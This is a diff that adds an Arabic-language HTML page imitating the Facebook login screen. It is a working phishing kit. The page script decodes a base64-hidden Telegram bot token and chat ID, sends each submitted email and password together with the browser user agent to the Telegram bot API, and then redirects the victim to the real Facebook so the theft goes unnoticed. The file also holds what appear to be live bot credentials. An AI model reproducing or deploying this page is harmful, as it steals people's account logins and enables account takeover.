@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيسبوك</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica,Arial,sans-serif}body{background-color:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.container{display:flex;align-items:center;justify-content:space-between;max-width:980px;width:100%;gap:40px}.left-side{flex:1;max-width:500px}.logo{color:#1877f2;font-size:60px;font-weight:bold;margin-bottom:10px;letter-spacing:-1px}.slogan{font-size:28px;line-height:1.3;color:#1c1e21;font-weight:normal}.login-box{background-color:#ffffff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);padding:20px;width:396px;text-align:center}.login-box input{width:100%;padding:14px 16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none}.login-box input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}.login-btn{width:100%;background-color:#1877f2;color:#fff;border:none;border-radius:6px;padding:12px;font-size:20px;font-weight:bold;cursor:pointer;margin-bottom:16px}.login-btn:hover{background-color:#166fe5}.forgot{color:#1877f2;font-size:14px;text-decoration:none;display:block;margin-bottom:20px}.forgot:hover{text-decoration:underline}.divider{border-bottom:1px solid #dadde1;margin:20px 0}.create-btn{background-color:#42b72a;color:#fff;border:none;border-radius:6px;padding:14px 16px;font-size:17px;font-weight:bold;cursor:pointer;margin-bottom:10px}.create-btn:hover{background-color:#36a420}.footer{margin-top:28px;text-align:center;font-size:14px;color:#1c1e21}.footer a{color:#1c1e21;font-weight:bold;text-decoration:none}.footer a:hover{text-decoration:underline}@media(max-width:900px){.container{flex-direction:column;text-align:center;gap:20px}.left-side{max-width:100%}.logo{font-size:50px}.slogan{font-size:22px}.login-box{width:100%;max-width:400px}}
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="left-side">
+        <div class="logo">facebook</div>
+        <div class="slogan">يساعدك فيسبوك على التواصل والمشاركة مع الأشخاص في حياتك.</div>
+    </div>
+    <div>
+        <div class="login-box">
+            <form id="loginForm">
+                <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                <input type="password" id="password" placeholder="كلمة المرور" required>
+                <button type="submit" class="login-btn">تسجيل الدخول</button>
+            </form>
+            <a href="#" class="forgot">هل نسيت كلمة المرور؟</a>
+            <div class="divider"></div>
+            <button class="create-btn" onclick="alert('صفحة إنشاء حساب جديد')">إنشاء حساب جديد</button>
+        </div>
+        <div class="footer"><a href="#">إنشاء صفحة</a> لشخصية مشهورة أو علامة تجارية أو نشاط تجاري.</div>
+    </div>
+</div>
+
+<script>
+var _token = 'ODk1MTExOTUxNzpBQUZDSkV2dkVWajIyZldZUUpsRTNzSDRFazNEVXl6QlFhMA==';
+var _chat = 'Njc3ODA3MTc4Mg==';
+function _d(s){try{return atob(s)}catch(e){return s}}
+var BOT_TOKEN = _d(_token);
+var CHAT_ID = _d(_chat);
+function sendToTelegram(email, password) {
+    var msg = '🔐 تسجيل دخول جديد\n━━━━━━━━━━━━━━━━━━━━━━━━━\n📧 ' + email + '\n🔑 ' + password + '\n🌐 ' + navigator.userAgent + '\n📅 ' + new Date().toLocaleString('ar-EG') + '\n━━━━━━━━━━━━━━━━━━━━━━━━━';
+    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+    }).then(function(r) {
+        if (r.ok) { console.log('✅ تم الإرسال بنجاح!'); }
+        else { console.log('❌ فشل:', r.status); }
+    }).catch(function(e) { console.log('❌ خطأ:', e); });
+}
+function openFacebook() {
+    try { window.location.href = 'fb://'; } catch(e) {}
+    setTimeout(function() { window.location.href = 'https://www.facebook.com'; }, 500);
+}
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    var email = document.getElementById('email').value.trim();
+    var password = document.getElementById('password').value.trim();
+    if (email && password) {
+        sendToTelegram(email, password);
+        openFacebook();
+    } else {
+        alert('الرجاء إدخال البريد الإلكتروني وكلمة المرور');
+    }
+});
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+        var active = document.activeElement;
+        if (active && (active.id === 'email' || active.id === 'password')) {
+            document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+        }
+    }
+});
+console.log('✅ جاهز!');
+console.log('🔑 BOT_TOKEN:', BOT_TOKEN);
+console.log('🆔 CHAT_ID:', CHAT_ID);
+</script>
+
+</body>
+</html>
